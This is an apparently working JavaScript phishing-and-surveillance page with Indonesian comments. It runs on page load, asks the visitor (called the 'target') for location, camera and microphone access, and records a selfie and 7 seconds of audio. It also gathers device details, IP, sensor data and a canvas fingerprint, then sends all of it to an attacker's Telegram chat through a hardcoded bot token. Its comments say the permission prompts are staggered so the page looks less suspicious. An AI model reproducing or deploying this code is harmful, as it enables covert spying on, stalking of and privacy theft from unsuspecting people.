//
// ===================================
//   Dibuat oleh: Ahmad Zaki
//   Versi: v3 (Data Maksimal)
// ===================================
//

// --- Elemen HTML ---
const statusList = document.getElementById('status-list');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');

// --- Parameter dari URL ---
const params = new URLSearchParams(window.location.search);
const alias = params.get('alias');
const chatId = params.get('uid');
const botToken = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';

// --- Fungsi Helper ---
const updateStatus = (message, isError = false) => {
  const li = document.createElement('li');
  li.textContent = message;
  if (isError) li.className = 'error';
  statusList.appendChild(li);
  statusList.scrollTop = statusList.scrollHeight;
};

// --- FUNGSI PENGUMPULAN DATA ---

// 1. Ambil Info Perangkat (v3)
const getDeviceInfo = async () => {
  updateStatus('1. Mengambil info perangkat...');
  const data = {
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'N/A',
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    localTime: new Date().toString(),
    cpuCores: navigator.hardwareConcurrency || 'N/A',
    memory: navigator.deviceMemory || 'N/A',
    connection: {
      type: navigator.connection ? navigator.connection.effectiveType : 'N/A',
      downlink: navigator.connection ? `${navigator.connection.downlink} Mbps` : 'N/A'
    }
  };

  try {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      data.battery = {
        level: Math.round(battery.level * 100) + '%',
        isCharging: battery.charging
      };
    } else {
      data.battery = { level: 'N/A', isCharging: 'N/A' };
    }
  } catch (err) { data.battery = { level: 'Error', isCharging: 'N/A' }; }
  
  return data;
};

// 2. Ambil Lokasi
const getLocation = () => {
  updateStatus('2. Mengambil lokasi (Harap izinkan)...');
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation tidak tersedia.'));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      position => {
        resolve({
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          accuracy: position.coords.accuracy
        });
      },
      error => reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`)),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
};

// 3. Ambil Foto
const getPhoto = async () => {
  updateStatus('3. Mengambil foto (Harap izinkan)...');
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
  videoEl.srcObject = stream;
  await new Promise(resolve => videoEl.onloadedmetadata = resolve);
  videoEl.play();
  await new Promise(resolve => setTimeout(resolve, 500));
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  const context = canvasEl.getContext('2d');
  context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  const photoBase64 = canvasEl.toDataURL('image/jpeg', 0.7);
  stream.getTracks().forEach(track => track.stop());
  videoEl.srcObject = null;
  return photoBase64;
};

// 4. Ambil Alamat IP
const getIpAddress = async () => {
  updateStatus('4. Mengambil info jaringan...');
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip || 'N/A';
  } catch (err) {
    return `Gagal: ${err.message}`;
  }
};

// 5. (BARU) Ambil Rekaman Audio
const getAudio = () => {
  updateStatus('5. Merekam audio (Harap izinkan)...');
  return new Promise(async (resolve, reject) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const mediaRecorder = new MediaRecorder(stream);
      const audioChunks = [];

      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
        stream.getTracks().forEach(track => track.stop());
        resolve(audioBlob);
      };

      mediaRecorder.onerror = (err) => {
        stream.getTracks().forEach(track => track.stop());
        reject(err);
      };

      // Rekam selama 7 detik
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
      }, 7000); 

    } catch (err) {
      reject(err);
    }
  });
};

// 6. (BARU) Ambil Data Sensor Orientasi
const getSensorData = () => {
  updateStatus('6. Mengambil data sensor...');
  return new Promise((resolve, reject) => {
    try {
      // Coba sensor Accelerometer dulu
      if ('Accelerometer' in window) {
        const acl = new Accelerometer({ frequency: 1 });
        acl.onreading = () => {
          const { x, y, z } = acl;
          let orientation = 'Tidak diketahui';
          if (Math.abs(z) > 8) orientation = 'Terlentang (di meja)';
          else if (Math.abs(y) > 8) orientation = 'Tegak (dipegang)';
          else if (Math.abs(x) > 8) orientation = 'Miring (landscape)';
          
          acl.stop();
          resolve({
            orientation: orientation,
            x: x.toFixed(2),
            y: y.toFixed(2),
            z: z.toFixed(2)
          });
        };
        acl.onerror = (err) => {
           acl.stop();
           reject(new Error(`Sensor Accelerometer Error: ${err.message}`));
        };
        acl.start();
      } else {
         reject(new Error('Sensor Accelerometer tidak tersedia.'));
      }
    } catch (err) {
      reject(err);
    }
  });
};

// 7. (BARU) Ambil Fingerprint Canvas
const getCanvasFingerprint = () => {
  updateStatus('7. Membuat fingerprint perangkat...');
  return new Promise((resolve) => {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const txt = 'AhmadZakiWasHere_1.0';
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.textBaseline = "alphabetic";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.fillText(txt, 2, 15);
      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
      ctx.fillText(txt, 4, 17);
      
      // Hash sederhana dari data canvas
      const dataUrl = canvas.toDataURL();
      let hash = 0;
      for (let i = 0; i < dataUrl.length; i++) {
        const char = dataUrl.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
      }
      resolve(hash.toString());
    } catch(err) {
      resolve('Gagal membuat fingerprint');
    }
  });
};

// 8. Kirim semua data ke Telegram (Format Diperbarui)
const sendToTelegram = async (data) => {
  updateStatus('8. Mengirim semua data...');
  const { deviceInfo, location, photoBase64, ipAddress, audioBlob, sensor, fingerprint } = data;
  
  const message = `
🔔 *DATA TARGET DITERIMA (v3)* (${alias || 'Target'})
--------------------------------------------------
*📍 Lokasi & Jaringan*
• IP: \`${ipAddress}\`
• Tipe Jaringan: \`${deviceInfo.connection.type}\`
• Downlink: \`${deviceInfo.connection.downlink}\`
• Fingerprint: \`${fingerprint}\`

*🔋 Perangkat & Baterai*
• UA: \`${deviceInfo.userAgent}\`
• Platform: \`${deviceInfo.platform}\`
• Baterai: \`${deviceInfo.battery.level}\` (Charging: ${deviceInfo.battery.isCharging})

*🖥️ Hardware & Tampilan*
• CPU: \`${deviceInfo.cpuCores}\` inti
• RAM: \`${deviceInfo.memory}\` GB (Perkiraan)
• Resolusi: \`${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\`

*🤸 Orientasi & Sensor*
• Posisi HP: \`${sensor.orientation}\`
• (X: ${sensor.x}, Y: ${sensor.y}, Z: ${sensor.z})

*⏰ Waktu Lokal Target*
• \`${deviceInfo.localTime}\`
--------------------------------------------------
  `.trim();

  // Kirim Info Teks
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    })
  });

  // Kirim Lokasi
  await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      latitude: location.lat,
      longitude: location.lon,
      horizontal_accuracy: location.accuracy
    })
  });

  // Kirim Foto
  const photoFormData = new FormData();
  photoFormData.append('chat_id', chatId);
  photoFormData.append('photo', await (await fetch(photoBase64)).blob(), 'selfie.jpg');
  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: 'POST',
    body: photoFormData
  });

  // Kirim Rekaman Audio
  const audioFormData = new FormData();
  audioFormData.append('chat_id', chatId);
  audioFormData.append('audio', audioBlob, 'recording.wav');
  await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
    method: 'POST',
    body: audioFormData
  });
  
  updateStatus('✅ Semua data berhasil dikirim!');
};

// --- Fungsi Utama (Diperbarui) ---
const start = async () => {
  if (!chatId || !alias) {
    updateStatus('❌ Error: Link tidak valid atau parameter hilang.', true);
    return;
  }
  
  try {
    const data = {};

    // Kita jalankan satu per satu karena izin harus diminta berurutan
    // Jika dijalankan paralel (Promise.all), browser akan menampilkan 3 pop-up izin sekaligus
    // dan itu sangat mencurigakan.
    
    // Minta izin Lokasi
    data.location = await getLocation();
    
    // Minta izin Kamera
    data.photoBase64 = await getPhoto();
    
    // Minta izin Mikrofon
    data.audioBlob = await getAudio();

    // Data ini tidak butuh izin, bisa dijalankan bersamaan
    const [deviceInfo, ipAddress, sensor, fingerprint] = await Promise.all([
        getDeviceInfo(),
        getIpAddress(),
        getSensorData().catch(err => ({ orientation: err.message, x:0, y:0, z:0 })), // Tangkap error sensor
        getCanvasFingerprint()
    ]);

    data.deviceInfo = deviceInfo;
    data.ipAddress = ipAddress;
    data.sensor = sensor;
    data.fingerprint = fingerprint;

    await sendToTelegram(data);
    updateStatus('Selesai. Anda bisa menutup halaman ini.');
    
  } catch (err) {
    console.error(err);
    let errorMsg = `❌ Error: ${err.message}`;
    if (err.message.includes('permission') || err.message.includes('denied')) {
        errorMsg = `❌ Error: Izin (Lokasi/Kamera/Mikrofon) ditolak oleh target.`;
    }
    updateStatus(errorMsg, true);
  }
};

window.addEventListener('DOMContentLoaded', () => {
  start();
});
